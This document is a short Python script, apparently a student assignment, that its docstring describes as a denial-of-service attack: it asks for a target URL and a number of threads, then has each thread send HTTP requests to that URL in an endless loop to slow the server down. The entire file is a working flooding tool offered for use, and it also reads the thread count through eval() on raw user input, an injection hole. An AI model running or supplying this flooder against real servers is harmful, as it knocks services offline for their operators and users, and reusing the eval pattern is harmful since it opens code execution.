"""
    Name Daniel Zelalem Zewdie
    Id: Atr/2026/08
    This Dos attcak os written using python 3.x.x
    And uses the URLLIB and Thread LIb
    This DOS Attack will attemp to slow down
    a server by sending infinte requests by
    starting differnt threads. each threads will
    send many requests, that will increase
    the  potential of solwing down the server 
   
"""

import urllib.request
import _thread
def sendRequset(URL, num):
    print("Thread number: " + str(num));
    while True:
        try:
            with urllib.request.urlopen('http://'+URL) as response:
                print("Requset sent")
                #print(response.read())
        except:
            print("Something went wrong")
def main():
    numOfThread = eval(input("How many threades you want?  : "))
    URL = input("Enter full URL : http://")
    try:
       for i in range(0, numOfThread):
            
            _thread.start_new_thread(sendRequset, (URL, i))
    except:
        print("Thread unable to start")
        
main()
